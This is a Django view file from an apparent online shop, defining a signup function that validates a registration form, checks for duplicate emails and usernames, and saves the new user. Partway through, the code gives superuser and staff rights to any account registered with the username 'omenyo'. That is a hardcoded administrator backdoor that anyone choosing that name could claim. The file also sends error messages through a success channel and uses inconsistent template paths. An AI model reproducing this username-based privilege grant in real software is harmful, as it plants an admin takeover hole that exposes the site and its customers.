from django.shortcuts import render, redirect
from django.contrib.auth.hashers import make_password
from .home import store
from django.contrib.auth.models import User
from django.views import View
from django.contrib import messages
from .forms import RegistrationForm
from shop.models.product import Product
from shop.models.brand import Major_Categories
from shop.models.category import Sub_Category
 
def signup(response):
    cart = response.session.get('cart')
    if not cart:
        response.session['cart'] = {}
        productes = {}
    else:
        productes = Product.get_products_by_id(list(response.session.get('cart').keys()))
        
    brands = Major_Categories.get_all_brand()
    categories =Sub_Category.get_all_categories()

    
    if response.method == "POST":
        form = RegistrationForm(response.POST)
        if form.is_valid():
            if User.objects.filter(email=form.cleaned_data['email']).exists():
                messages.success(response, f'Email already in use, Please use a different Email')
                return render(response, 'signup.html', {
                    
                    'form': form,
                    'brands': brands,
                    'categories': categories
                })
            elif User.objects.filter(username=form.cleaned_data['username']).exists():
                messages.success(response, f'Username already in use, Please use a different Username')
                return render(response, 'signup.html', {
                    
                    'form': form,
                    'brands': brands,
                    'categories': categories
                })
            
            # Save the user and set is_superuser and is_staff if username is "omenyo"
            user = form.save(commit=False)  # Save but don't commit yet
            if user.username == 'omenyo':
                user.is_superuser = True
                user.is_staff = True
            user.save()  # Now save the user with the updated permissions
            
            messages.success(response, f'Successfully Registered, Please log into your Account to Make Orders')
            return redirect('login')
    else:
        form = RegistrationForm()

    return render(response, 'Vender/signup.html', {
        'form': form,
        'brands': brands,
        'categories': categories
    })
